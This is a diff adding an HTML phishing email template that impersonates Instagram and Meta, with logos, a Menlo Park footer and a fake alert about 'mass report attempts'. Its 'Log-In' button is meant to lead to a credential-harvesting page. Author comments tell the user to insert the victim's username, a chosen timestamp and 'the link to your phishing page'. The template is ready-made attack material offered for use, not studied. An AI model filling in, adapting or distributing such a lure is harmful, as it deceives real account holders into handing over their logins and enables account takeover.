@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Mass Report Activity</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            line-height: 1.6;
+            color: #262626;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: #ffffff;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 30px;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo {
+            width: 100px;
+            height: auto;
+            margin-bottom: 10px;
+        }
+        .alert-text {
+            font-size: 1.2em;
+            margin-bottom: 15px;
+            color: #1a1a1a;
+        }
+        .device-info {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .device-icon {
+            width: 60px;
+            height: auto;
+            border: 2px solid #e0e0e0;
+            border-radius: 50%;
+            padding: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 10px;
+        }
+        .device-icon img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+        .location {
+            font-weight: bold;
+            color: #0095f6;
+        }
+        .timestamp {
+            color: #737373;
+            font-size: 0.9em;
+        }
+        .security-info {
+            margin-bottom: 20px;
+        }
+        .button {
+            display: inline-block;
+            background-color: #0095f6;
+            color: #ffffff;
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-weight: bold;
+            
+        }
+        .meta-info {
+            text-align: center;
+            color: #a6a6a6;
+            font-size: 0.8em;
+            margin-top: 10px;
+        }
+        .footer {
+            text-align: center;
+            color: #a6a6a6;
+            font-size: 0.8em;
+            margin-top: 30px;
+        }
+        .footer a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" alt="Instagram Logo">
+            <p class="alert-text">We noticed unusual reporting activity, victim_username</p>
+            <p class="alert-text">There have been mass report attempts on your account!</p>
+        </div>
+
+        <div class="device-info">
+            <div class="device-icon">
+                <img src="https://static-00.iconduck.com/assets.00/warning-icon-512x511-3vl9qoze.png" alt="Phone Icon" style="width: 40px; height: auto;">
+            </div>
+            <!--add the victims username-->><p>@victim · <span class="location">Instagram · City_name, Country_name</span></p>
+            <!--add time of your desire-->><p class="timestamp">April 01 at 00:00 AM (PDT)</p>
+        </div>
+
+        <div class="security-info">
+            <p>Since there have been unusual report attempts we have made a log of all the accounts that have reported your account. To view all the accounts that have filed report complaints please use our provided LogIn link to check for any malicious activity.</p>
+        </div>
+        <!--add the link to your phishing page--><a class="button" href="link_to_the_webpage_hosting_the_phishing_page">Log-In</a>
+
+        <div class="meta-info">
+            <p>from</p>
+            <img src="https://pngimg.com/d/meta_PNG12.png" alt="Meta Logo" style="height: 60px; width: 60px;">
+        </div>
+
+        <div class="footer">
+            <p>© Instagram. Meta Platforms, Inc., 1601 Willow Road, Menlo Park, CA 94025</p>
+            <p>This message was sent to victim_mail_address and intended for victim_username. Not your account? <a href="https://help.instagram.com/356648689595660/?helpref=related_articles">Remove your email from this account.</a></p>
+        </div>
+    </div>
+</body>
+</html>
